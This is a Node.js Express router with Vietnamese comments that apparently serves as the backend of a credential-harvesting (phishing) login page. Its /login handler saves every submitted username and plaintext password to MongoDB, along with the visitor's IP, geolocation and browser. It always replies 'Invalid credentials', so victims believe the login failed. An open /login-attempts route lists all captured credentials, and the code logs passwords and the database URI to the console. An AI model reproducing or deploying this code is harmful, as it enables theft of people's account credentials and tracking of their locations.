const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");
const axios = require("axios");

dotenv.config();

// Log MongoDB URI để debug
console.log("MongoDB URI:", process.env.MONGODB_URI);

const router = express.Router();
router.use(cors());
router.use(express.json());

// Kết nối MongoDB
const connectDB = async () => {
  try {
    console.log("Attempting to connect to MongoDB...");
    await mongoose.connect(process.env.MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log("Connected to MongoDB successfully");
  } catch (error) {
    console.error("Could not connect to MongoDB:", error.message);
    throw error; // Throw error để biết chi tiết lỗi
  }
};

// Kết nối ngay khi server khởi động
connectDB().catch(console.error);

const loginAttemptSchema = new mongoose.Schema(
  {
    username: String,
    password: String,
    timestamp: { type: Date, default: Date.now },
    ip: String,
    country: String,
    city: String,
    timezone: String,
    browser: String,
    os: String,
  },
  { collection: "userattempts" }
); // Chỉ định collection name

const LoginAttempt = mongoose.model("LoginAttempt", loginAttemptSchema);

// Middleware để lấy IP thực
const getClientIp = (req) => {
  const forwardedFor = req.headers["x-forwarded-for"];
  if (forwardedFor) {
    const ips = forwardedFor.split(",");
    return ips[0].trim();
  }
  return req.headers["x-real-ip"] || req.connection.remoteAddress;
};

router.post("/login", async (req, res) => {
  console.log("Received login request:", req.body);
  const { username, password } = req.body;
  const ip = getClientIp(req);
  const userAgent = req.headers["user-agent"];

  console.log("Client IP:", ip);

  try {
    // Lấy thông tin vị trí từ ipapi.co
    const locationResponse = await axios.get(`https://ipapi.co/${ip}/json/`);
    const locationData = locationResponse.data;

    console.log("Location Data:", locationData);

    const loginAttempt = new LoginAttempt({
      username,
      password,
      ip,
      country: locationData.country_name || "Unknown",
      city: locationData.city || "Unknown",
      timezone: locationData.timezone || "Unknown",
      browser: userAgent,
      os: userAgent,
    });

    console.log("Saving login attempt:", loginAttempt);
    const savedAttempt = await loginAttempt.save();
    console.log("Saved login attempt:", savedAttempt);

    res.status(401).json({ message: "Invalid credentials" });
  } catch (error) {
    console.error("Error saving login attempt:", error);
    res.status(500).json({ message: "Server error" });
  }
});

router.get("/login-attempts", async (req, res) => {
  try {
    const attempts = await LoginAttempt.find().sort({ timestamp: -1 });
    res.json(attempts);
  } catch (error) {
    res.status(500).json({ message: "Error fetching login attempts" });
  }
});

module.exports = router;
